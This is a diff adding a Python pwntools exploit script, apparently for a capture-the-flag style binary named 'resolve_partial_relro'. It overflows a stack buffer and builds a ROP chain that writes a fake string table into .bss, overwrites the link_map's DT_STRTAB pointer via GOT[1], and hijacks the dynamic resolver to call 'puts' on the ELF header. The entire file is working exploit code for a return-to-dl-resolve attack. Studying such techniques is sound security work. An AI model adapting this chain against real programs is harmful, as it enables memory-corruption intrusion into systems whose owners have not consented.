@@ -1,0 +1,129 @@
+#!/usr/bin/env python3
+from pwn import *
+
+
+fname = 'resolve_partial_relro'
+ip = '0.0.0.0'
+port = 5000 #change this
+context.binary = elf = ELF('resolve_partial_relro')
+
+
+
+
+LOCAL = True
+
+if LOCAL:
+    r = process(fname,aslr=True)
+
+    gdbscript="""
+    b *main
+    b *0x00000000004011c8
+    b *0x00000000004011bb
+
+
+    """
+    #set follow-fork-mode
+
+    attach('resolve_partial_relro',gdbscript=gdbscript)
+else:
+    r = remote(ip, port)
+
+s = lambda x : r.send(x)
+rl = lambda : r.recvline()
+rlb = lambda : r.recvlineb()
+sl = lambda x : r.sendline(x)
+ru = lambda x :r.recvuntil(x)
+rcb = lambda x :r.recvb(x)
+sla = lambda x,y : r.sendlineafter(x,y)
+inter = lambda : r.interactive()
+
+
+def pwn():
+
+
+
+	GOT1 = 0x404008
+
+	pop_rdi = 0x0000000000401273
+	pop_rsi_r15 = 0x0000000000401271
+	pop_rdx = 0x00000000004011d1
+
+	
+	write_with_offset = 0x00000000004011dc	#: mov qword ptr [rdx + rsi], rdi; ret;
+	read_from_ptr = 0x00000000004011d8 		#: mov rdi, qword ptr [rdx]; ret; 
+	mov_rdx_rdi = 0x00000000004011e1
+
+	resolve = 0x401040						#for setbuf
+
+	fake_frame_addr = 0x00000000004040a0    #in .bss
+
+	fake_frame = b''
+	fake_frame += p64(0x5)						#d_tag	#0x4040a0 - 0x4040a8
+	fake_frame += p64(fake_frame_addr + 0x10)	#d_val	#0x4040a8 - 0x4040b0
+	fake_frame += b'\x00'					#start of fake .dynstr 0x4040b0
+	fake_frame += b'libc.so.6\x00'
+	fake_frame += b'stdin\x00'
+	fake_frame += b'read\x00'
+	fake_frame += b'stdout\x00'
+	fake_frame += b'puts\x00\x00\x00'				#setbuf was here before
+	fake_frame += b'__libc_start_main\x00'
+	fake_frame += b'GLIBC_2.2.5\x00'
+	fake_frame += b'__gmon_start__\x00'
+
+	len_fake_frame = len(fake_frame)
+
+	payload = b''
+	payload += b'A'*24		
+
+	#write our fake_frame into .bss
+	payload += p64(pop_rdi)				
+	payload += p64(0x00)					#stdin
+	payload += p64(pop_rsi_r15)
+	payload += p64(fake_frame_addr)			#where
+	payload += p64(0x00)					#junk
+	payload += p64(pop_rdx)
+	payload += p64(len_fake_frame)			#how many bytes
+	payload += p64(elf.plt['read'])
+
+
+
+	#get pointer from GOT[1]
+	payload += p64(pop_rdx)
+	payload += p64(GOT1)
+	payload += p64(read_from_ptr)
+
+	#rdi now holds the link_map pointer we need to add 0x68 for the fake DT_STRTAB entry
+	
+	#we will write with mov qword ptr [rdx + rsi], rdi; ret;
+	#so we need to setup the registers
+	payload += p64(mov_rdx_rdi)				#rdx now holds the link_map pointer
+	payload += p64(pop_rsi_r15)			
+	payload += p64(0x68)					#rsi holds the offset
+	payload += p64(0x00)					#r15 junk
+	payload += p64(pop_rdi)				
+	payload += p64(fake_frame_addr)			#rdi holds the addr where we want to point the new d_val to
+
+	#write fake_frame_pointer
+	payload += p64(write_with_offset)
+
+
+	#set arg for resolved puts
+	payload += p64(pop_rdi)
+	payload += p64(0x400000)
+
+	#and thann call the resolver
+	payload += p64(0x401040)
+
+	#we crash here but '\x7fELF' should be printed
+	payload += p64(0x111111)*4 
+
+	s(payload)
+	input('press enter to send fake_frame')
+	s(fake_frame)
+	inter()
+
+if __name__ == '__main__':
+    pwn()
+
+
+
